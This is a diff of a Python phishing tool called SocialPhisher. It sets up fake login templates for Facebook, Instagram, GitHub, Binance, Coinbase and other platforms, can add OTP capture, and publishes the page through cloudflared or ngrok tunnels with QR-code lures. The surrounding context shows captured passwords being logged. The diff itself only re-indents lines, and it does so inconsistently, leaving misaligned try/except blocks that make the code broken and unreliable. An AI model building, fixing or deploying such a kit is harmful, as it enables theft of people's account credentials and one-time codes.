@@ -53,23 +53,23 @@ class SocialPhisher:
     def _ensure_directories(self):
         """Ensure all required directories exist."""
         try:
-            # Create main directories
-            os.makedirs(self.templates_dir, exist_ok=True)
-            os.makedirs(self.output_dir, exist_ok=True)
-            os.makedirs(self.qr_dir, exist_ok=True)
-            
-            # Create platform-specific directories for all supported platforms
-            platforms = [
-                'facebook', 'instagram', 'twitter', 'linkedin', 'tiktok', 'snapchat',
-                'github', 'binance', 'telegram', 'pinterest', 'reddit', 'coinbase'
-            ]
-            for platform in platforms:
-                platform_dir = os.path.join(self.templates_dir, platform)
-                os.makedirs(platform_dir, exist_ok=True)
-                # Ensure index.html exists
-                index_file = os.path.join(platform_dir, 'index.html')
-                if not os.path.exists(index_file):
-                    console.print(f"[yellow]Warning: {index_file} template missing[/yellow]")
+        # Create main directories
+        os.makedirs(self.templates_dir, exist_ok=True)
+        os.makedirs(self.output_dir, exist_ok=True)
+        os.makedirs(self.qr_dir, exist_ok=True)
+        
+        # Create platform-specific directories for all supported platforms
+        platforms = [
+            'facebook', 'instagram', 'twitter', 'linkedin', 'tiktok', 'snapchat',
+            'github', 'binance', 'telegram', 'pinterest', 'reddit', 'coinbase'
+        ]
+        for platform in platforms:
+            platform_dir = os.path.join(self.templates_dir, platform)
+            os.makedirs(platform_dir, exist_ok=True)
+            # Ensure index.html exists
+            index_file = os.path.join(platform_dir, 'index.html')
+            if not os.path.exists(index_file):
+                console.print(f"[yellow]Warning: {index_file} template missing[/yellow]")
         except Exception as e:
             console.print(f"[red]Error creating directories: {str(e)}[/red]")
             raise
@@ -111,7 +111,7 @@ class SocialPhisher:
                                         message=f"The template for {platform.title()} is missing.")
                 
                 # Set selected platform
-                self.selected_platform = platform
+                    self.selected_platform = platform
                 
                 # Render template
                 return render_template(template_path, platform=platform)
@@ -458,7 +458,7 @@ Password: {password}
                     console.print(f"[yellow]Warning during Windows cleanup: {str(e)}[/yellow]")
             else:
                 try:
-                    subprocess.run(['pkill', '-9', 'cloudflared'], stderr=subprocess.DEVNULL)
+                subprocess.run(['pkill', '-9', 'cloudflared'], stderr=subprocess.DEVNULL)
                 except Exception as e:
                     console.print(f"[yellow]Warning during Unix cleanup: {str(e)}[/yellow]")
             
@@ -480,7 +480,7 @@ Password: {password}
                         try:
                             import urllib.request
                             urllib.request.urlretrieve(download_url, 'cloudflared.exe')
-                        except Exception as e:
+            except Exception as e:
                             console.print(f"[red]Failed to download cloudflared: {str(e)}[/red]")
                             return False
                         # Add current directory to PATH
@@ -510,8 +510,8 @@ Password: {password}
                     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                     self.cloudflared_process = subprocess.Popen(
                         ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
                         startupinfo=startupinfo,
                         text=True,
                         bufsize=1,
@@ -528,14 +528,14 @@ Password: {password}
                     )
                 
                 # Wait for tunnel URL
-                start_time = time.time()
+            start_time = time.time()
                 timeout = 30
-                url_found = False
+            url_found = False
                 error_count = 0
                 max_errors = 3
-                
-                console.print("[yellow]Waiting for tunnel to be established...[/yellow]")
-                
+            
+            console.print("[yellow]Waiting for tunnel to be established...[/yellow]")
+            
                 while (time.time() - start_time) < timeout and not url_found and error_count < max_errors:
                     if self.cloudflared_process.poll() is not None:
                         error = self.cloudflared_process.stderr.read().strip() if self.cloudflared_process.stderr else "Unknown error"
@@ -553,8 +553,8 @@ Password: {password}
                     for pipe in ready_pipes:
                         try:
                             line = pipe.readline().strip()
-                            if line:
-                                if "trycloudflare.com" in line:
+                        if line:
+                            if "trycloudflare.com" in line:
                                     url_match = re.search(r'https?://[^\s|\]]+\.trycloudflare\.com', line)
                                     if url_match:
                                         base_url = url_match.group(0)
@@ -562,21 +562,21 @@ Password: {password}
                                         url = f"{base_url}/?platform={platform}"
                                         
                                         # Display success message
-                                        console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
+                                                    console.print("\n[bold green]═══════════════════════════════════════[/bold green]")
                                         console.print(f"[bold green]Tunnel URL: {url}[/bold green]")
-                                        console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
-                                        
+                                                    console.print("[bold green]═══════════════════════════════════════[/bold green]\n")
+                                                    
                                         # Generate QR code
-                                        self.generate_qr_code(url, platform)
-                                        url_found = True
+                                                    self.generate_qr_code(url, platform)
+                                                    url_found = True
                                         break
                                 elif "error" in line.lower():
                                     error_count += 1
                                     console.print(f"[yellow]Warning: {line}[/yellow]")
-                        except Exception as e:
+                except Exception as e:
                             error_count += 1
                             if error_count >= max_errors:
-                                console.print(f"[red]Error reading cloudflared output: {str(e)}[/red]")
+                    console.print(f"[red]Error reading cloudflared output: {str(e)}[/red]")
                 
                 if not url_found:
                     console.print("[red]Failed to get tunnel URL within timeout period[/red]")
@@ -662,7 +662,7 @@ Password: {password}
                             with zipfile.ZipFile('ngrok.zip', 'r') as zip_ref:
                                 zip_ref.extractall('.')
                             os.remove('ngrok.zip')
-                        except Exception as e:
+            except Exception as e:
                             console.print(f"[red]Failed to download ngrok: {str(e)}[/red]")
                             return False
                         # Add current directory to PATH
@@ -685,15 +685,15 @@ Password: {password}
                         os.environ['PATH'] = f"{os.getcwd()}:{os.environ['PATH']}"
                 except Exception as e:
                     console.print(f"[red]Failed to install ngrok: {str(e)}[/red]")
-                    return False
+                return False
             
             # Start ngrok tunnel
             try:
                 if platform_module.system() == "Windows":
                     self.ngrok_process = subprocess.Popen(
                         ['ngrok', 'http', str(port)],
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
                         creationflags=subprocess.CREATE_NO_WINDOW
                     )
                 else:
@@ -743,9 +743,9 @@ Password: {password}
                     return False
                 
                 console.print("[red]Failed to get ngrok tunnel URL[/red]")
-                return False
-                
-            except Exception as e:
+            return False
+            
+        except Exception as e:
                 console.print(f"[red]Error starting ngrok tunnel: {str(e)}[/red]")
                 return False
                 
@@ -832,9 +832,9 @@ Password: {password}
     def run(self):
         """Run the social phishing module."""
         try:
-            # Load settings first
-            self.load_settings()
-            
+        # Load settings first
+        self.load_settings()
+        
             # Show platform options in a 2-row table format
             table = Table(
                 title="[bold red]Available Social Media Platforms[/bold red]",
@@ -892,24 +892,24 @@ Password: {password}
                         choices=[str(i) for i in range(1, 13)],
                         show_choices=False
                     )
-                    
-                    # Map choices to platform names
-                    platform_map = {
-                        "1": "facebook",
-                        "2": "instagram",
-                        "3": "twitter",
-                        "4": "tiktok",
-                        "5": "snapchat",
-                        "6": "github",
-                        "7": "binance",
-                        "8": "telegram",
-                        "9": "pinterest",
-                        "10": "reddit",
-                        "11": "coinbase",
-                        "12": "linkedin"
-                    }
-                    
-                    self.selected_platform = platform_map[choice]
+        
+        # Map choices to platform names
+        platform_map = {
+            "1": "facebook",
+            "2": "instagram",
+            "3": "twitter",
+            "4": "tiktok",
+            "5": "snapchat",
+            "6": "github",
+            "7": "binance",
+            "8": "telegram",
+            "9": "pinterest",
+            "10": "reddit",
+            "11": "coinbase",
+            "12": "linkedin"
+        }
+        
+        self.selected_platform = platform_map[choice]
                     console.print(f"\n[bold green]Selected platform: {self.selected_platform.upper()}[/bold green]")
                     break
                     
@@ -923,38 +923,38 @@ Password: {password}
             if not os.path.exists(template_dir):
                 console.print(f"[red]Error: Template directory for {self.selected_platform} not found![/red]")
                 return
-            
-            # Check if OTP template exists and ask user if they want to use it
+        
+        # Check if OTP template exists and ask user if they want to use it
             otp_template = os.path.join(template_dir, 'otp.html')
-            if os.path.exists(otp_template):
-                use_otp = Prompt.ask("Enable OTP verification?", choices=["y", "n"], default="n")
-                self.use_otp = use_otp.lower() == "y"
-                if self.use_otp:
-                    console.print("[green]OTP verification enabled[/green]")
-            
-            # Find available port
-            port = self._find_available_port()
+        if os.path.exists(otp_template):
+            use_otp = Prompt.ask("Enable OTP verification?", choices=["y", "n"], default="n")
+            self.use_otp = use_otp.lower() == "y"
+            if self.use_otp:
+                console.print("[green]OTP verification enabled[/green]")
+        
+        # Find available port
+        port = self._find_available_port()
             if not port:
                 console.print("[red]Error: No available ports found![/red]")
                 return
             
-            console.print(f"[green]Found available port: {port}[/green]")
+        console.print(f"[green]Found available port: {port}[/green]")
+        
+        # Start the Flask server in a separate thread
+        server_thread = threading.Thread(
+            target=self.start_server,
+            kwargs={'port': port}
+        )
+        server_thread.daemon = True
+        server_thread.start()
+        
+        # Wait for server to be ready
+        if not self._wait_for_server(port):
+            console.print("[red]Failed to start server[/red]")
+            return
             
-            # Start the Flask server in a separate thread
-            server_thread = threading.Thread(
-                target=self.start_server,
-                kwargs={'port': port}
-            )
-            server_thread.daemon = True
-            server_thread.start()
-            
-            # Wait for server to be ready
-            if not self._wait_for_server(port):
-                console.print("[red]Failed to start server[/red]")
-                return
-            
-            console.print(f"[green]Server started successfully on port {port}[/green]")
-            
+        console.print(f"[green]Server started successfully on port {port}[/green]")
+        
             # Show tunnel options in a table
             tunnel_table = Table(title="Tunneling Services", show_header=True, header_style="bold magenta")
             tunnel_table.add_column("ID", style="cyan", justify="center")
@@ -980,7 +980,7 @@ Password: {password}
                 if not self.start_ngrok(port, self.selected_platform):
                     console.print("[red]Failed to start Ngrok tunnel[/red]")
                     return
-            
+                    
             try:
                 while True:
                     time.sleep(1)
